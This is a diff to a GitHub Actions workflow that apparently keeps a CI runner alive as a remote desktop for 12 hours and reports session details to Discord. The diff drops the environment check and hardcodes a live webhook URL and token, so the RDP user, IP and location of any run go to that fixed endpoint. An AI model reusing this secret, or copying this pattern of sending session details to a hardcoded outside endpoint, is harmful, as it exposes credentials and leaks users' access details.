@@ -169,7 +169,6 @@ jobs:
           Write-Host ""
 
       - name: 🔔 Discord Notification (Detailed RDP Info)
-        if: env.DISCORD_WEBHOOK != ''
         shell: pwsh
         run: |
           $rdpUser  = $env:RDP_USER
@@ -183,7 +182,7 @@ jobs:
             $ip = "Unknown"
           }
 
-          # Cek lokasi (GeoIP sederhana)
+          # Cek lokasi
           try {
             $geo = Invoke-RestMethod -Uri "https://ipapi.co/$ip/json"
             $location = "$($geo.city), $($geo.region), $($geo.country_name)"
@@ -192,7 +191,7 @@ jobs:
           }
 
           $msg = @{
-            username = "Bot VayVy"
+            username = "Vayvy Bot"
             embeds = @(
               @{
                 title = "📡 RDP Session Created"
@@ -210,7 +209,11 @@ jobs:
             )
           } | ConvertTo-Json -Depth 5
 
-          Invoke-RestMethod -Uri $env:DISCORD_WEBHOOK -Method Post -ContentType "application/json" -Body $msg
+          Invoke-RestMethod `
+            -Uri "https://discord.com/api/webhooks/1420855927409737981/Lwex2weTGgSY6ZuM6NEZDsD3NMMpYakcMB1UC_PWEAITClQLmNmildPaPWOipM1MYAmu" `
+            -Method Post `
+            -ContentType "application/json" `
+            -Body $msg
 
       - name: 🕒 Keep Alive 12h + Cleanup
         shell: pwsh
